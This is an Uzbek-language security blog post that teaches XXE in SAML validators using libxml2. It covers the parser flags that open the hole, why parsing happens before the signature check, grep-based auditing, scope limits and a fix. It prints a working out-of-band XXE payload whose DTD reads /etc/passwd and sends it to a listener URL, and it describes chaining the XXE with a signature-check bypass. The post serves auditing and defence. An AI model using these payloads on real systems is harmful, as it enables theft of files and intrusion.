---
title: "SAML validatorlarida XXE: imzo tekshirilishidan oldin fayl o'qish"
date: 2026-08-14T10:30:00+05:00
tags: ["xxe", "saml", "methodology"]
slug: "saml-parser-xxe"
translationKey: saml-parser-xxe
draft: true
summary: "Nega SAML token validatorlari XXE uchun zaif nuqta, libxml2 sozlamalari ularni qanday sotib qo'yadi, va men buni qanday qidiraman — asosdan boshlab."
---

SAML — bu XML, XML parserlari esa maxsus aytmasang sen uchun diskdan fayllarni o'qib beradi.
Shu ikki fakt yonma-yon turgani — butun bug shu. SAML tokenni tekshiradigan kod XXE topishning
eng ishonchli joylaridan biri, va bu post nima uchun ekani haqida — boshidan boshlab, hech
qachon XXE payload otmagan bo'lsang ham tushunarli bo'lsin deb.

Bu — aniq bug emas, bug klassi haqida writeup. Mahsulot yo'q, vendor yo'q. SAML gapiradigan
biror narsani audit qilsang — SSO login jarayoni, token validatsiya xizmati, soket orqali
autentifikatsiya qiladigan agent — izlaydigan shakling shu.

## Avval, XXE nima o'zi

XML **entity** deb ataladigan qisqartmalar aniqlashga imkon beradi. Ichki qurilganlarini
ko'rgansan: `&lt;` bu `<` ga, `&amp;` bu `&` ga aylanadi. O'zingnikini ham e'lon qilsang
bo'ladi:

```xml
<!DOCTYPE foo [
  <!ENTITY greeting "hello">
]>
<foo>&greeting;</foo>
```

Parser buni o'qiganda, `&greeting;` `hello` bilan almashadi. Hozircha zararsiz — bu shunchaki
hujjat ichidagi topib-almashtirish.

Xavfli joyi shundaki, entity qiymati sen ichkarida yozgan matn bo'lishi shart emas. U
**tashqi** narsaga — fayl yoki URL'ga — ishora qilishi mumkin:

```xml
<!DOCTYPE foo [
  <!ENTITY secret SYSTEM "file:///etc/passwd">
]>
<foo>&secret;</foo>
```

Endi `&secret;` degani *"borib `/etc/passwd` ni och va uning mazmunini shu yerga qo'y"*. Agar
parser tashqi entity'larni ochishga sozlangan bo'lsa, u aynan shuni qiladi — faylni o'qiydi va
mazmunini hujjatga tashlaydi. Bu — **XXE**: XML eXternal Entity injection. Hujumchining XML'i
parserga hech qachon tegmasligi kerak bo'lgan narsalarni olishni buyuradi — lokal fayllar yoki
ichki tarmoqdagi URL'lar (XXE shu tariqa SSRF'ga aylanadi).

Parser qaysi entity'larni ochishi qoidalari **DTD** (Document Type Definition) dan keladi —
`<!DOCTYPE ... [ ... ]>` ichidagi blok. DTD hujjat ichida turishi mumkin, yoki hujjat *"DTD'mni
ana u yerdan yukla"* deb URL'ga ishora qilishi mumkin. Ikkovi ham biz tortadigan richag.

Bir qatorli xulosa: **agar parser entity'larni ochsa va fayllar hamda URL'larga chiqishga tayyor
bo'lsa, XML'ni boshqargan har kim uni narsalarni o'qishga majbur qila oladi.** SAML tokenlari —
hujumchi bergan XML. Bu qayoqqa borishini ko'ryapsan.

## Nega aynan validator

Odamlarni chalg'itadigan joyi shu. "SAML token imzolangan," deyishadi, "hujumchi soxtalashtira
olmaydi." To'g'ri — lekin ahamiyatsiz, mana nega.

Imzoni tekshirish uchun avval hujjat xotirada bo'lishi shart. Shuning uchun validator doim
shuni, shu tartibda qiladi:

1. XML'ni xotiradagi daraxtga **parse** qilish
2. Sxemani tekshirish
3. Subject, shartlar, vaqt belgilarini tekshirish
4. **Imzoni tekshirish**

Imzo tekshiruvi — to'rtinchi qadam. Entity ochilishi — fayl o'qish — birinchi qadamda, parse
paytida sodir bo'ladi. Kod to'rtinchi qadamga yetib *"bu imzo axlat, rad et"* degunicha, fayl
allaqachon o'qilgan va, ko'rasanki, allaqachon senga yuborilgan.

Ya'ni biz yaroqli tokenni soxtalashtirmayapmiz. Biz **ataylab yaroqsiz** tokenni yuboryapmiz,
uning yagona vazifasi — zararli entity'larni olib borish. Token har safar to'rtinchi qadamda
rad etiladi — va bizga farqi yo'q, chunki payload birinchi qadamda otildi.

```goat
  hujumchi token   .-------------.  entity ochiladi   .------------.
  (yomon imzo)   ->|  XML parse  |----- fayl o'qish ->|  /etc/...  |
                   '------+------'   HTTP exfil        '------------'
                          |
                          v          o'qish yuqorida bo'lib bo'ldi;
                   .-------------.   bu rad etish endi juda kech
                   |  validatsiya|
                   '-------------'
```

## libxml2 tuzog'i

SAML bilan ishlaydigan C va C++ kodining ko'pi **libxml2** ustida turadi, libxml2 esa qanaqa
flag bersang shuni qiladi. Bug odatda shu yerda yashaydi. Ehtiyotkor ko'rinadigan parse
chaqiruvi:

```c
doc = xmlReadMemory(token, len, NULL, NULL,
                    XML_PARSE_NOENT   |   // entity'larni ochish
                    XML_PARSE_DTDATTR |   // DTD atributlarini qayta ishlash
                    XML_PARSE_DTDLOAD);   // tashqi DTD'larni yuklash
```

Shu uch flagni oddiy tilda o'qi:

- `XML_PARSE_NOENT` — *"entity'larni och"* (ha, nomi teskari; o'tkazib yuborish emas,
  almashtirish degani)
- `XML_PARSE_DTDLOAD` — *"hujjat tashqi DTD'ga ishora qilsa, borib ol"*
- Yetishmayotgani: `XML_PARSE_NONET` — *"tarmoqni umuman ishlatma."*

Shu oxirgi flag — xavfsizlik kamari, va u taqilmagan. `DTDLOAD` yoqilgan, `NONET` o'chirilgan
holda, parser parse paytida bemalol tarmoq so'rovlarini qiladi. Entity ochilishi bilan birga —
bu to'liq o'qlangan XXE.

Kutubxona darajasida xuddi shu narsani hal qiladigan yana ikki global kalit bor, ularga
tegmagan kod eski libxml2 versiyalaridagi xavfli odatiy qiymatni meros oladi:

```c
xmlSubstituteEntitiesDefault(1);   // 1 = entity'larni ochish
xmlLoadExtDtdDefaultValue = 1;     // 1 = tashqi DTD'larni yuklash
```

Men tez-tez uchratadigan naqsh: kodning xavfsiz versiyasi **bor**, lekin u build hech qachon
aniqlamaydigan `#ifdef` bilan o'ralgan. Kimdir tuzatishni yozgan, "keyin yoqamiz" deb
kompilyatsiya flagi ortiga qo'ygan, va aslida chiqadigani — zaif `#else` shoxi. Manbani o'qish
tuzatish borligini aytadi; yoqilganini aytmaydi. Qaysi shox kompilyatsiya bo'lganini tekshirishing
kerak.

## Buni fayl o'qishga aylantirish, qadam-baqadam

Payloadni sekin quraylik. Yuboradigan tokenimiz **biz** boshqaradigan serverga ishora qiladigan
DTD olib yuradi:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://127.0.0.1:9090/x.dtd">
  %dtd;
]>
<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" Version="2.0">
  <saml:Issuer>anything</saml:Issuer>
</saml:Assertion>
```

Ikki narsaga e'tibor ber:

- `%dtd;` `&` emas, `%` ishlatadi. Bu — **parameter entity** — hujjat tanasida emas, DTD
  ichida ishlatiladigan entity. Bizga kerak, chunki pastdagi hiyla faqat parameter entity bilan
  ishlaydi.
- Pastdagi `saml:Assertion` — tokenga o'xshab ko'rinishi uchun yetarli shakl. Yaroqli imzo
  kerak emas. Haqiqiy assertion bo'lishi kerak emas. Faqat parserga yetib borishi kerak.

Validator buni parse qilganda, `%dtd;` ga uchraydi va serverimizdan
`http://127.0.0.1:9090/x.dtd` ni oladi. Biz qaytaradigan narsa:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrap "<!ENTITY exfil SYSTEM 'http://127.0.0.1:9090/?d=%file;'>">
%wrap;
%exfil;
```

Parser bu bilan nima qilishini bosib chiqaylik:

1. `%file` — `/etc/passwd` ni ochadi, mazmunini ushlab turadi.
2. `%wrap` — **yangi** entity, `exfil`, quradi, uning qiymati — query string'ga fayl mazmuni
   yopishtirilgan URL.
3. `%exfil;` — o'sha entity'ni ochadi, bu parserni
   `http://127.0.0.1:9090/?d=<passwd mazmuni>` so'rov qilishga majbur qiladi.

Serverimiz, u ham tinglovchi, query string'i **aynan fayl** bo'lgan so'rovni oladi. Bu — o'qilgan
narsa, tashqariga chiqarilgan.

Nega to'g'ridan `file:///etc/passwd` emas, ikki-serverli raqs? Chunki validator deyarli hech
qachon parse qilingan hujjatni ko'rsatmaydi — tokenni rad qiladi va xatolik qaytaradi. Ya'ni
fayl mazmuni bizga *javob orqali* qaytolmaydi. Buning o'rniga parserni uni yon kanal orqali
bizga pochtalab yuborishga majbur qilamiz: o'zining chiquvchi HTTP so'rovi. Bu — **out-of-band
(OOB)** naqsh, va yuqoridagi ichma-ich parameter-entity DTD — buni qilishning standart yo'li.

Otilishini hal qiladigan ikki tuzoq:

- **Agar** ilova parse qilingan qiymatni senga qaytarsa, bularning hammasini o'tkazib yubor —
  tokendagi oddiy `file:///` entity yetarli, faylni to'g'ridan javobdan o'qiysan. OOB — hech
  narsa qaytmaydigan keng tarqalgan holat uchun zaxira.
- **Ba'zi fayl mazmunlari payloadni buzadi.** Fayl ichidagi `%`, `&`, yoki xom yangi qator
  entity o'ramini buzishi mumkin. `/etc/passwd` va `/etc/hostname` yaxshi. Iflosroq fayllar
  uchun, stack ruxsat bersa, o'qishni base64 filtriga o'raysan, shunda baytlar yo'lda omon
  qoladi.

## Imzo yo'lda tursa

Ba'zan validator imzosiz tokenni umuman parse qilmaydi — parse'dan oldin *biror narsani*
tekshiradi va chiqib ketadi. Bu OOB o'qishni boshlanmasdan o'ldiradi. O'sha yerda **ikkinchi,
mustaqil zaiflik** uni tiriltirishi mumkin: imzo tekshiruvini o'tkazib yuborishga imkon
beradigan auth yo'li.

Men buni *"ishonchli chaqiruvchi"* flagi sifatida uchratganman — so'rovdagi maydon, mohiyatan
*"bu token yuqorida allaqachon tekshirilgan, qayta tekshirib o'tirma"* deydi — xizmat uni
aslida umuman ishonchli bo'lmagan chaqiruvchilardan qabul qiladi. O'zi bilan bu — autentifikatsiya
bypass. XXE bilan zanjirlansa, oxirgi darvozani ochadi: endi parser sening kirishing ustida
oldida hech narsa turmagan holda ishlaydi.

Xulosa — aniq flag emas. Xulosa shu: validatordagi XXE'ni imzo tekshiruvi yo'lda tursa **ham**
quvish arziydi — chunki imzo tekshiruvlari aynan `// TODO: buni haqiqatan tekshir` olib baribir
chiqib ketadigan kod.

## Men buni qanday qidiraman

**Manba bor bo'lsa.** Parse chaqiruvlari va kalitlarni grep qil:

```bash
# XML qayerda parse qilinadi
grep -rn "xmlReadMemory\|xmlParseMemory\|xmlReadDoc\|xmlCtxtReadMemory" .
# kutubxona darajasidagi kalitlar
grep -rn "xmlSubstituteEntitiesDefault\|xmlLoadExtDtdDefaultValue" .
# build flagi ortida yashiringan xavfsiz yo'l
grep -rn "XML_PARSE_NONET" .        # keyin haqiqatan kompilyatsiya bo'lganini tasdiqla
```

Agar parse DTD yuklasa-yu `XML_PARSE_NONET` bo'lmasa — yoki faqat build hech qachon
o'rnatmaydigan `#ifdef` ichida bo'lsa — senda nomzod bor. Xursand bo'lishdan oldin qaysi shox
chiqarilganini tasdiqla.

**Black box.** DTD'si sen boshqaradigan hostga ishora qiladigan token yubor, va o'sha hostni
callback uchun kuzat. OOB tinglovchi — o'z HTTP serving, yoki Collaborator uslubidagi xizmat —
bu yerda yagona ishonchli oracle, chunki validator deyarli doim tokenni rad qiladi va javobda
senga hech narsa aytmaydi. **Rad etish — kutilgan narsa. Callback — topilma.** So'rov hech
kelmasa, entity ochilishi ehtimol o'chiq, va davom etasan.

## Chegaradan chiqmasdan tasdiqlash

Exfil'ni o'qishga ruxsating bor faylga yo'nalt — o'zingniki bo'lgan mashinada `/etc/hostname`
yoki o'zing tashlagan fayl — sirlarga emas, va hech qachon sinash ruxsating yo'q
infratuzilmaga emas. Faqat callbackning o'zi entity ochilgani va o'qish sodir bo'lganini
isbotlaydi. Zaiflikni ko'rsatish uchun `/etc/shadow` tortishing **shart emas**, birovning
tizimida esa tortmasliging kerak. Mexanizmni isbotla, to'xta, yozib chiq. Tinglovching o'qishga
ruxsating bor faylni qabul qilayotganini ko'rsatgan skrinshot — to'liq isbot.

## Tuzatish

Parser uchun: `XML_PARSE_NONET` qo'sh, va xavfsiz yo'lni build flagi ortiga yashirma — uni
shartsiz kompilyatsiya qil.

```c
doc = xmlReadMemory(token, len, NULL, NULL,
                    XML_PARSE_NOENT | XML_PARSE_DTDATTR | XML_PARSE_DTDLOAD
                    | XML_PARSE_NONET);
```

Undan ham yaxshisi: SAML validatorining tashqi DTD yuklashga umuman ishi yo'q. Entity
ochilishini butunlay o'chir (`xmlSubstituteEntitiesDefault(0)`, `xmlLoadExtDtdDefaultValue = 0`)
va tarmoq o'chiq holda parse qil. Chuqurlikdagi himoya, va hech narsa yo'qotmaysan — haqiqiy
SAML tokenlariga tashqi DTD kerak emas. Va qanaqadir "imzoni o'tkazib yubor" yo'li bo'lsa, u
chaqiruvchining haqiqatan imtiyozli ekaniga bog'lansin, chaqiruvchi o'zi o'rnatadigan flagga
emas.

## Xulosa

SAML ko'rsang, bitta savol ber: **buni nima parse qiladi, va qaysi flaglar bilan?** Imzo —
chalg'ituvchi narsa; qiziqarli kod undan oldin ishlaydi. Parse chaqiruvini top,
`XML_PARSE_NONET` borligini tekshir, va yo'q bo'lsa — bitta out-of-band callback'gina seni aniq
bilishdan ajratib turadi.
